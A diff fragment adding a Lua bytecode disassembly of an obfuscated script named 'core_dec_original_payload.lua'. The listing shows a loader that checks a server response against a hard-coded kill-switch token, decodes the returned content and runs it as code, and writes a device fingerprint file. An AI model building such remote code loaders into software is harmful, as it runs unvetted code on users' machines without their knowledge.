+	70	[1]	GETUPVAL 	13 4	; j
+	71	[1]	LOADK    	14 -16	; "82"
+	72	[1]	CALL     	13 2 2
+	73	[1]	GETUPVAL 	14 4	; j
+	74	[1]	LOADK    	15 -6	; "0.5"
+	75	[1]	CALL     	14 2 2
+	76	[1]	POW      	13 13 14
+	77	[1]	GETUPVAL 	14 4	; j
+	78	[1]	LOADK    	15 -17	; "9"
+	79	[1]	CALL     	14 2 2
+	80	[1]	GETUPVAL 	15 4	; j
+	81	[1]	LOADK    	16 -18	; "33"
+	82	[1]	CALL     	15 2 2
+	83	[1]	ADD      	14 14 15
+	84	[1]	GETUPVAL 	15 4	; j
+	85	[1]	LOADK    	16 -19	; "42"
+	86	[1]	CALL     	15 2 2
+	87	[1]	GETUPVAL 	16 4	; j
+	88	[1]	LOADK    	17 -20	; "52"
+	89	[1]	CALL     	16 2 2
+	90	[1]	ADD      	15 15 16
+	91	[1]	GETUPVAL 	16 4	; j
+	92	[1]	LOADK    	17 -21	; "94"
+	93	[1]	CALL     	16 2 2
+	94	[1]	GETUPVAL 	17 4	; j
+	95	[1]	LOADK    	18 -22	; "65"
+	96	[1]	CALL     	17 2 2
+	97	[1]	MOD      	16 16 17
+	98	[1]	CALL     	8 9 0
+	99	[1]	CALL     	7 0 2
+	100	[1]	SELF     	7 7 -23	; "gsub"
+	101	[1]	LOADK    	9 -24	; "[\022]"
+	102	[1]	LOADK    	10 -25	; "HK"
+	103	[1]	CALL     	7 4 2
+	104	[1]	SELF     	7 7 -23	; "gsub"
+	105	[1]	LOADK    	9 -26	; "[\t]"
+	106	[1]	LOADK    	10 -27	; "EX"
+	107	[1]	TAILCALL 	7 4 0
+	108	[1]	RETURN   	7 0
+	109	[1]	RETURN   	0 1
+constants (27) for <prototype-address-omitted>:
+	1	"exp_factor"
+	2	"math"
+	3	"pi"
+	4	"3.1415926535"
+	5	"phase_shift"
+	6	"0.5"
+	7	"100"
+	8	"10"
+	9	"2"
+	10	"36"
+	11	"char_offset"
+	12	"72"
+	13	"15"
+	14	"57"
+	15	"25"
+	16	"82"
+	17	"9"
+	18	"33"
+	19	"42"
+	20	"52"
+	21	"94"
+	22	"65"
+	23	"gsub"
+	24	"[\022]"
+	25	"HK"
+	26	"[\t]"
+	27	"EX"
+locals (7) for <prototype-address-omitted>:
+	0	af	3	109
+	1	ag	8	109
+	2	ah	18	109
+	3	ai	28	109
+	4	aj	39	109
+	5	ak	40	109
+	6	al	43	109
+upvalues (8) for <prototype-address-omitted>:
+	0	ad
+	1	a8
+	2	a9
+	3	h
+	4	j
+	5	aa
+	6	ac
+	7	ab
+
+function <core_dec_original_payload.lua:1,1> (10 instructions, 40 bytes at <prototype-address-omitted>)
+1 param, 3 slots, 2 upvalues, 1 local, 3 constants, 0 functions
+	1	[1]	GETUPVAL 	1 0	; j
+	2	[1]	LOADK    	2 -1	; "1"
+	3	[1]	CALL     	1 2 2
+	4	[1]	EQ       	0 1 0
+	5	[1]	JMP      	4	; to 10
+	6	[1]	GETUPVAL 	1 1	; h
+	7	[1]	GETTABLE 	1 1 -2	; "core_func_byby"
+	8	[1]	LOADK    	2 -3	; "\228\184\141\230\152\175G\231\137\136\230\156\172"
+	9	[1]	CALL     	1 2 1
+	10	[1]	RETURN   	0 1
+constants (3) for <prototype-address-omitted>:
+	1	"1"
+	2	"core_func_byby"
+	3	"\228\184\141\230\152\175G\231\137\136\230\156\172"
+locals (1) for <prototype-address-omitted>:
+	0	ar	1	10
+upvalues (2) for <prototype-address-omitted>:
+	0	j
+	1	h
+
+function <core_dec_original_payload.lua:1,1> (5 instructions, 20 bytes at <prototype-address-omitted>)
+0 params, 2 slots, 1 upvalue, 0 locals, 2 constants, 0 functions
+	1	[1]	GETUPVAL 	0 0	; h
+	2	[1]	GETTABLE 	0 0 -1	; "os"
+	3	[1]	GETTABLE 	0 0 -2	; "exit"
+	4	[1]	CALL     	0 1 1
+	5	[1]	RETURN   	0 1
+constants (2) for <prototype-address-omitted>:
+	1	"os"
+	2	"exit"
+locals (0) for <prototype-address-omitted>:
+upvalues (1) for <prototype-address-omitted>:
+	0	h
+
+function <core_dec_original_payload.lua:1,1> (5 instructions, 20 bytes at <prototype-address-omitted>)
+1 param, 2 slots, 1 upvalue, 1 local, 3 constants, 0 functions
+	1	[1]	GETUPVAL 	1 0	; h
+	2	[1]	GETTABLE 	1 1 -1	; "def"
+	3	[1]	GETTABLE 	1 1 -2	; "role"
+	4	[1]	SETTABLE 	1 -3 0	; "helperID" -
+	5	[1]	RETURN   	0 1
+constants (3) for <prototype-address-omitted>:
+	1	"def"
+	2	"role"
+	3	"helperID"
+locals (1) for <prototype-address-omitted>:
+	0	at	1	5
+upvalues (1) for <prototype-address-omitted>:
+	0	h
+
+function <core_dec_original_payload.lua:1,1> (159 instructions, 636 bytes at <prototype-address-omitted>)
+1 param, 11 slots, 11 upvalues, 9 locals, 25 constants, 0 functions
+	1	[1]	GETTABLE 	1 0 -1	; "name"
+	2	[1]	EQ       	1 1 -2	; - "completed"
+	3	[1]	JMP      	25	; to 29
+	4	[1]	GETUPVAL 	1 0	; h
+	5	[1]	GETTABLE 	1 1 -3	; "def"
+	6	[1]	GETTABLE 	1 1 -4	; "debugkey"
+	7	[1]	TEST     	1 0 0
+	8	[1]	JMP      	4	; to 13
+	9	[1]	GETUPVAL 	1 0	; h
+	10	[1]	GETTABLE 	1 1 -5	; "print"
+	11	[1]	GETTABLE 	2 0 -1	; "name"
+	12	[1]	CALL     	1 2 1
+	13	[1]	GETTABLE 	1 0 -1	; "name"
+	14	[1]	EQ       	0 1 -6	; - "failed"
+	15	[1]	JMP      	12	; to 28
+	16	[1]	GETUPVAL 	1 0	; h
+	17	[1]	GETTABLE 	1 1 -3	; "def"
+	18	[1]	GETTABLE 	1 1 -4	; "debugkey"
+	19	[1]	TEST     	1 0 0
+	20	[1]	JMP      	4	; to 25
+	21	[1]	GETUPVAL 	1 0	; h
+	22	[1]	GETTABLE 	1 1 -5	; "print"
+	23	[1]	LOADK    	2 -7	; "not ok"
+	24	[1]	CALL     	1 2 1
+	25	[1]	GETUPVAL 	1 1	; S
+	26	[1]	GETUPVAL 	2 2	; d
+	27	[1]	CALL     	1 2 1
+	28	[1]	RETURN   	0 1
+	29	[1]	GETTABLE 	1 0 -8	; "request"
+	30	[1]	GETTABLE 	2 1 -9	; "getResponseStatusCode"
+	31	[1]	MOVE     	3 1
+	32	[1]	CALL     	2 2 2
+	33	[1]	GETUPVAL 	3 3	; j
+	34	[1]	LOADK    	4 -10	; "200"
+	35	[1]	CALL     	3 2 2
+	36	[1]	EQ       	1 2 3
+	37	[1]	JMP      	1	; to 39
+	38	[1]	RETURN   	0 1
+	39	[1]	GETTABLE 	3 1 -11	; "getResponseData"
+	40	[1]	MOVE     	4 1
+	41	[1]	CALL     	3 2 2
+	42	[1]	TEST     	3 0 0
+	43	[1]	JMP      	112	; to 156
+	44	[1]	EQ       	0 3 -12	; - "u7bTrcq508Ow19bttcfCvMb3"
+	45	[1]	JMP      	4	; to 50
+	46	[1]	GETUPVAL 	4 0	; h
+	47	[1]	GETTABLE 	4 4 -13	; "core_func_exit"
+	48	[1]	CALL     	4 1 1
+	49	[1]	RETURN   	0 1
+	50	[1]	EQ       	0 3 -14	; - "OK"
+	51	[1]	JMP      	21	; to 73
+	52	[1]	GETUPVAL 	4 0	; h
+	53	[1]	GETTABLE 	4 4 -3	; "def"
+	54	[1]	GETTABLE 	4 4 -4	; "debugkey"
+	55	[1]	TEST     	4 0 0
+	56	[1]	JMP      	4	; to 61
+	57	[1]	GETUPVAL 	4 0	; h
+	58	[1]	GETTABLE 	4 4 -5	; "print"
+	59	[1]	LOADK    	5 -15	; "same version"
+	60	[1]	CALL     	4 2 1
+	61	[1]	GETUPVAL 	4 0	; h
+	62	[1]	GETTABLE 	4 4 -16	; "isloaded"
+	63	[1]	TEST     	4 0 1
+	64	[1]	JMP      	7	; to 72
+	65	[1]	GETUPVAL 	4 4	; L
+	66	[1]	CALL     	4 1 2
+	67	[1]	TEST     	4 0 1
+	68	[1]	JMP      	3	; to 72
+	69	[1]	GETUPVAL 	4 5	; a6
+	70	[1]	GETUPVAL 	5 6	; e
+	71	[1]	CALL     	4 2 1
+	72	[1]	RETURN   	0 1
+	73	[1]	GETUPVAL 	4 0	; h
+	74	[1]	GETTABLE 	4 4 -17	; "require"
+	75	[1]	LOADK    	5 -18	; "cjson"
+	76	[1]	CALL     	4 2 2
+	77	[1]	GETTABLE 	5 4 -19	; "decode"
+	78	[1]	MOVE     	6 3
+	79	[1]	CALL     	5 2 2
+	80	[1]	TEST     	5 0 1
+	81	[1]	JMP      	12	; to 94
+	82	[1]	GETUPVAL 	6 0	; h
+	83	[1]	GETTABLE 	6 6 -3	; "def"
+	84	[1]	GETTABLE 	6 6 -4	; "debugkey"
+	85	[1]	TEST     	6 0 0
+	86	[1]	JMP      	4	; to 91
+	87	[1]	GETUPVAL 	6 0	; h
+	88	[1]	GETTABLE 	6 6 -5	; "print"
+	89	[1]	LOADK    	7 -20	; "json decode error"
+	90	[1]	CALL     	6 2 1
+	91	[1]	GETUPVAL 	6 1	; S
+	92	[1]	GETUPVAL 	7 6	; e
+	93	[1]	CALL     	6 2 1
+	94	[1]	GETTABLE 	6 5 -21	; "version"
+	95	[1]	TEST     	6 0 0
+	96	[1]	JMP      	3	; to 100
+	97	[1]	GETTABLE 	6 5 -22	; "content"
+	98	[1]	TEST     	6 0 1
+	99	[1]	JMP      	13	; to 113
+	100	[1]	GETUPVAL 	6 0	; h
+	101	[1]	GETTABLE 	6 6 -3	; "def"
+	102	[1]	GETTABLE 	6 6 -4	; "debugkey"
+	103	[1]	TEST     	6 0 0
+	104	[1]	JMP      	4	; to 109
+	105	[1]	GETUPVAL 	6 0	; h
+	106	[1]	GETTABLE 	6 6 -5	; "print"
+	107	[1]	LOADK    	7 -23	; "json format error"
+	108	[1]	CALL     	6 2 1
+	109	[1]	GETUPVAL 	6 1	; S
+	110	[1]	GETUPVAL 	7 6	; e
+	111	[1]	CALL     	6 2 1
+	112	[1]	RETURN   	0 1
+	113	[1]	GETUPVAL 	6 7	; D
+	114	[1]	GETTABLE 	7 5 -22	; "content"
+	115	[1]	CALL     	6 2 2
+	116	[1]	TEST     	6 0 1
+	117	[1]	JMP      	13	; to 131
+	118	[1]	GETUPVAL 	7 0	; h
+	119	[1]	GETTABLE 	7 7 -3	; "def"
+	120	[1]	GETTABLE 	7 7 -4	; "debugkey"
+	121	[1]	TEST     	7 0 0
+	122	[1]	JMP      	4	; to 127
+	123	[1]	GETUPVAL 	7 0	; h
+	124	[1]	GETTABLE 	7 7 -5	; "print"
+	125	[1]	LOADK    	8 -24	; "content decode error"
+	126	[1]	CALL     	7 2 1
+	127	[1]	GETUPVAL 	7 1	; S
+	128	[1]	GETUPVAL 	8 6	; e
+	129	[1]	CALL     	7 2 1
+	130	[1]	JMP      	28	; to 159
+	131	[1]	GETUPVAL 	7 8	; J
+	132	[1]	MOVE     	8 6
+	133	[1]	CALL     	7 2 3
+	134	[1]	TEST     	7 0 0
+	135	[1]	JMP      	7	; to 143
+	136	[1]	GETUPVAL 	9 9	; R
+	137	[1]	GETTABLE 	10 5 -22	; "content"
+	138	[1]	CALL     	9 2 1
+	139	[1]	GETUPVAL 	9 10	; Q
+	140	[1]	GETTABLE 	10 5 -21	; "version"
+	141	[1]	CALL     	9 2 1
+	142	[1]	JMP      	16	; to 159
+	143	[1]	GETUPVAL 	9 0	; h
+	144	[1]	GETTABLE 	9 9 -3	; "def"
+	145	[1]	GETTABLE 	9 9 -4	; "debugkey"
+	146	[1]	TEST     	9 0 0
+	147	[1]	JMP      	4	; to 152
+	148	[1]	GETUPVAL 	9 0	; h
+	149	[1]	GETTABLE 	9 9 -5	; "print"
+	150	[1]	LOADK    	10 -25	; "run code error"
+	151	[1]	CALL     	9 2 1
+	152	[1]	GETUPVAL 	9 1	; S
+	153	[1]	GETUPVAL 	10 6	; e
+	154	[1]	CALL     	9 2 1
+	155	[1]	JMP      	3	; to 159
+	156	[1]	GETUPVAL 	4 1	; S
+	157	[1]	GETUPVAL 	5 6	; e
+	158	[1]	CALL     	4 2 1
+	159	[1]	RETURN   	0 1
+constants (25) for <prototype-address-omitted>:
+	1	"name"
+	2	"completed"
+	3	"def"
+	4	"debugkey"
+	5	"print"
+	6	"failed"
+	7	"not ok"
+	8	"request"
+	9	"getResponseStatusCode"
+	10	"200"
+	11	"getResponseData"
+	12	"u7bTrcq508Ow19bttcfCvMb3"
+	13	"core_func_exit"
+	14	"OK"
+	15	"same version"
+	16	"isloaded"
+	17	"require"
+	18	"cjson"
+	19	"decode"
+	20	"json decode error"
+	21	"version"
+	22	"content"
+	23	"json format error"
+	24	"content decode error"
+	25	"run code error"
+locals (9) for <prototype-address-omitted>:
+	0	a7	1	159
+	1	X	30	159
+	2	Y	33	159
+	3	E	42	159
+	4	Z	77	155
+	5	_	80	155
+	6	K	116	155
+	7	N	134	155
+	8	O	134	155
+upvalues (11) for <prototype-address-omitted>:
+	0	h
+	1	S
+	2	d
+	3	j
+	4	L
+	5	a6
+	6	e
+	7	D
+	8	J
+	9	R
+	10	Q
+
+function <core_dec_original_payload.lua:1,1> (31 instructions, 124 bytes at <prototype-address-omitted>)
+1 param, 5 slots, 1 upvalue, 2 locals, 9 constants, 0 functions
+	1	[1]	GETUPVAL 	1 0	; h
+	2	[1]	GETTABLE 	1 1 -1	; "device"
+	3	[1]	GETTABLE 	1 1 -2	; "writablePath"
+	4	[1]	LOADK    	2 -3	; "bzuuid"
+	5	[1]	CONCAT   	1 1 2
+	6	[1]	GETUPVAL 	2 0	; h
+	7	[1]	GETTABLE 	2 2 -4	; "io"
+	8	[1]	GETTABLE 	2 2 -5	; "exists"
+	9	[1]	MOVE     	3 1
+	10	[1]	CALL     	2 2 2
+	11	[1]	TEST     	2 0 1
+	12	[1]	JMP      	12	; to 25
+	13	[1]	GETUPVAL 	2 0	; h
+	14	[1]	GETTABLE 	2 2 -6	; "crypto"
+	15	[1]	GETTABLE 	2 2 -7	; "md5"
+	16	[1]	MOVE     	3 0
+	17	[1]	CALL     	2 2 2
+	18	[1]	MOVE     	0 2
+	19	[1]	GETUPVAL 	2 0	; h
+	20	[1]	GETTABLE 	2 2 -8	; "core_func_writefile"
+	21	[1]	MOVE     	3 1
+	22	[1]	MOVE     	4 0
+	23	[1]	CALL     	2 3 1
+	24	[1]	RETURN   	0 2
+	25	[1]	GETUPVAL 	2 0	; h
+	26	[1]	GETTABLE 	2 2 -4	; "io"
+	27	[1]	GETTABLE 	2 2 -9	; "readfile"
+	28	[1]	MOVE     	3 1
+	29	[1]	TAILCALL 	2 2 0
+	30	[1]	RETURN   	2 0
+	31	[1]	RETURN   	0 1
+constants (9) for <prototype-address-omitted>:
+	1	"device"
+	2	"writablePath"
+	3	"bzuuid"
+	4	"io"
+	5	"exists"
+	6	"crypto"
+	7	"md5"
+	8	"core_func_writefile"
+	9	"readfile"
+locals (2) for <prototype-address-omitted>:
+	0	a3	1	31
+	1	G	6	31
+upvalues (1) for <prototype-address-omitted>:
+	0	h
